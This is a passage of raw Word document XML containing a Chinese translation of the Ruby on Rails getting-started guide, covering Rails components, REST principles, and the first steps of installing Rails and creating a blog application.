          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.3 Action Dispatch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD4F56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Action Dispatch 处理了你和其他部分的应用程序的路由——一些Web请求以及你的配置。Rack applications 是更高级的模块，你可以到 </w:t>
      </w:r>
      <w:hyperlink r:id="rId66" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails on Rack</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 了解它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16D829FF" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.4 Action Mailer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCFD57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Action Mailer 是一个营造 E-mail 服务的框架。你可以使用 Action Mailer 去发送、接收 Email 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293DB237" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.5 Active Model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEABC6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Active Model 提供了 Action Pack gem 服务和 Object Relationship Mapping gems 之间的接口定义，比如 Active 记录。Active Model 允许 Rails 在 Active Record 部分采用其他 ORM 框架如果你的应用程序需要。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4B7046" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.6 Active Record</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1EFCA1"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Active Record 是一个 Rails 应用程序的 Models 根本。它提供有 CRUD 功能独立的数据库，有高级的查找、与另一个 Models 关联的能力，支持几乎所有数据库服务。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CE861B" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.7 Active Resource</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FB769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Active Resource 提供一个管理目标业务和 </w:t>
      </w:r>
      <w:r w:rsidRPr="003604C1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>RESTful</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> web 服务之间连接的框架。它实现了使用 CRUD 语义测绘 web-base 资源到本地目标。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3500CB28" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.8 Active Support</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7E8AA1"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Active Support 是一个广泛收集实用工具类和标准的 Ruby 库的扩展，它们由的核心代码和您的应用程序决定。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63993F2B" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3.1.9 Railties</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0919380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Railties 是在 Rails 代码中创建新 Rails 应用以及在任何 Rails 应用中把粘和各种插件在一起的核心。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278825FD"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4 REST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D261787"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Rest作为具有代表性的状态传输是 RESTful 架构的基础。普遍认为它来自 Roy Fielding’s doctoral 的博士论文 《"Architectural Styles and the Design of Network-based Software Architectures":http://www.ics.uci.edu/~fielding/pubs/dissertation /top.htm》 当你阅读这篇论文的时候,（可以发现）REST 在 Rails 下面可以归纳为下面的主要原则：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29616DDC" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>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使用资源标识符比如 URLs 去表现资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C06645" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>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Transferring representations of the state of that resource between system components.在系统组件之间转移（传送）资源的状态</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0520144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例如，下面的 HTTP 请求：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB6858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DELETE /photos/14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072DDD3F"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（系统）将会明白参照 ID 为 14 的 phone 资源，注明删除该资源。 REST 的自然风格去架构 web 应用程序， Rails 通过这样的钩子，使你避免了许多复杂的 RESTful 和浏览器之间的差异。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="058D72C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如果你想要了解更多关于 REST 架构风格, 以下这些资源可能比 Fielding 的论文更平易近人一些。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E785126" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId67" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>A Brief Introduction to REST</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> by Stefan Tilkov</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CDDC06" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId68" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>An Introduction to REST</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> (video tutorial) by Joe Gregorio</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C7E9504" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId69" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Representational State Transfer</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> article in Wikipedia</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F279530" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="008938C9" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId70" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>How to GET a Cup of Coffee</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> by Jim Webber, Savas Parastatidis &amp; Ian Robinson</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C93515E"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5 建立一个新的 Rails 应用程序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AA5519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学习（使用）本指导的最好方式是跟随这里描述的每一步，不写代码或者没有例子所需的步骤会使得这个例子被冷落，你可以根据文字描述的步骤一步接着一步的操作。如果你需要完整的代码你可以从这里下载 </w:t>
      </w:r>
      <w:hyperlink r:id="rId71" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Getting Started Code</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23383B3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如果你跟随这个指导，你将会创建一个叫做 blog 的 Rails 项目——一个非常简单的网络博客。当你准备开始构建这个项目之前你需要确保 Rails 已经完全安装。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F45792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下面例子中使用 `#` 和 `$` 来表示 终端提示。如果你正在使用 Windows 提示可能会这样 `c:\source_code&gt;`</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="674515B8"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5.1 安装 Rails</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="605F2429"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通过方便的 RubyGems 提供的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>gem install</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，安装 Rails：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2496"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="08A5957B" w14:textId="77777777" w:rsidTr="003604C1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3CFB1D7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gem install rails</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="536434D9"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如果你在 Window 下面工作，你可以使用 </w:t>
      </w:r>
      <w:hyperlink r:id="rId72" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails Installer</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 快速安装 Ruby and Rails。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464C4644"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确认所有的（依赖）安装正确，你应该运行如下命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2256"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="1C75BCAD" w14:textId="77777777" w:rsidTr="003604C1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="77308BF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rails --version</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6BD3F2C4"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如果终端提示类似这样的文字 “Rails 3.2.2” 那么你已经准备好继续了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1532B4"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5.2 Creating the Blog Application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7146F3A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开始，打开一个 terminal,导航至一个你有权限创建文件的文件夹，并输入：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="2255FD58" w14:textId="77777777" w:rsidTr="003604C1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="49FDA2A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rails new blog #--skip-bundle    # Don't run bundle install这样在国内就不会由于连不上gem即便上能够上也会很慢半天没反映 可以尝试使用 淘宝gem镜像</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="57E4EB8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这里将创建一个名叫 Blog 的 Rails 应用程序在名称为 blog 的目录中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042CED6B"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你可以通过运行 rails new -h，查看 Rails 应用程序创建器的所有命令（开关）。 当你创建了这个 blog 程序，跳转到它所在的文件夹中（直接对这个程序编辑）.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1296"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="000A4DFB" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A9CE50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cd blog</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="265E37E7"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命令 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails new blog</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会创建一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blog</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文件夹在你的工作目录中。目录 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blog</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 包含一些自动生成的文件它构成了 Rails 应用程序的结构。在这个体验中的大多数的工作都是在 app/ 这个文件夹中完成的，这里对 Rails 默认创建的每一个文件和文件夹的功能做出了一个概述：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1753"/>
        <w:gridCol w:w="6769"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="56409C4F" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="079368B9" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>File/Folder</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
